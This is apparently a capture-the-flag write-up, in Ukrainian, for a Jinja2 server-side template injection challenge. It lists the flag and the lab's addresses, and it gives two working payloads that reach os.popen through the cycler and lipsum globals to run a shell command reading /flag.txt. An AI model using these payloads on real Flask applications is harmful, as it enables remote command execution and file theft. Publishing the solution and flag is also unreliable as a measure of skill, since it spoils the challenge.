# 01. SSTI Comms Console (100 балів) — розв'язок

Прапор: `CTF{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`

1. Відкрийте консоль: `http://<host>:8001` (або `http://172.28.0.11:5000` через VPN).
2. Поле «Позивний» підставляється прямо в рядок шаблону Jinja2:
   `render_template_string("Operator " + callsign + " linked...")`.
3. Перевірка ін'єкції: позивний `{{7*7}}` дає `Operator 49 linked...`.
4. Читання прапора з процесу консолі (файл `/flag.txt`):

```jinja2
{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
```

Або коротший варіант через глобальний об'єкт `lipsum`:

```jinja2
{{ lipsum.__globals__['os'].popen('cat /flag.txt').read() }}
```

5. У відповіді терміналу з'явиться `CTF{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`.

Підказка в самому застосунку: сторінка `/source` показує вразливий виклик
`render_template_string`, але не містить прапора.
